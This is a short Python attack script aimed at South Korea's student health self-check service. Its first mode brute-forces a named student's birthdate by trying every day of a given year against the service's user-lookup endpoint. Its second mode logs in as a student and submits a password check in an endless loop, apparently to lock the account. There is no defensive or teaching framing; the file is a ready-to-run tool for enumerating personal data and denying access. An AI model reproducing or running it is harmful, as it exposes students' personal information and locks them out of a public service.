
import time
import hcskr
from hcskr.mapping import schoolinfo, encrypt
import requests

import asyncio
from login import login
from validate_password import encrypt_password
from validate_password import validate_password


def find_birth():
      name = str(input('Name: '))
      birth_year = str(input('Birth Year: '))
      area = str(input('Area: '))
      school_name = str(input('School Name: '))
      school_level = str(input('School Level: '))

      info = schoolinfo(area, school_level)

      data = {
            'ltcnScCode': info['schoolcode'],
            'schulCrseScCode': info['schoollevel'],
            'orgName': school_name,
            'loginType': 'school'
      }

      schulList = requests.get(
            'https://hcs.eduro.go.kr/v2/searchSchool',
            data
      ).json()['schulList']

      for i, school in enumerate(schulList):
            print(f'{i} : {school}\n')

      choice = int(input('Choice : '))

      org_code = schulList[choice]['orgCode']

      result = []

      for month in range(12):
            for day in range(31):
                  data = {
                  'birthday': encrypt(f'{str(birth_year).zfill(2)}{str(month + 1).zfill(2)}{str(day + 1).zfill(2)}'),
                  'loginType': 'school',
                  'name': encrypt(name),
                  'orgCode': org_code,
                  'stdntPNo': None
                  }

                  res = requests.post(
                        f'https://{info["schoolurl"]}hcs.eduro.go.kr/v2/findUser',
                        json=data
                  ).json()

                  if 'token' in res.keys():
                        result.append(f'{str(birth_year).zfill(2)}{str(month + 1).zfill(2)}{str(day + 1).zfill(2)}')

                  print(f'\r{round((((day + 1) + (month) * 31)/(12 * 31)) * 100, 2)}%', end='')

      print('')
      for r in result:
            print(r)


def block():
      name = str(input('Name: '))
      birth = str(input('Birth: '))
      area = str(input('Area: '))
      school_name = str(input('School Name: '))
      school_level = str(input('School Level: '))
      test_password = str(input('Test Password: '))
      # 학생 인증 토큰을 token에 저장
      token = login(
            area, school_name, school_level, birth, name
      )['token']
      count = 1
      data = asyncio.get_event_loop().run_until_complete(encrypt_password(test_password))

      while True:
            a = validate_password(token, data)
            if 'data' not in a.keys():
                  print(f'\n[!]Error: { a }')
                  return
            
            print(f'\rBlock {count} time', end='')
            count += 1


choice = int(input('Find Birth(0) or Block(1) : '))

if choice == 0:
      find_birth()
elif choice == 1:
      block()
else:
      print('?')

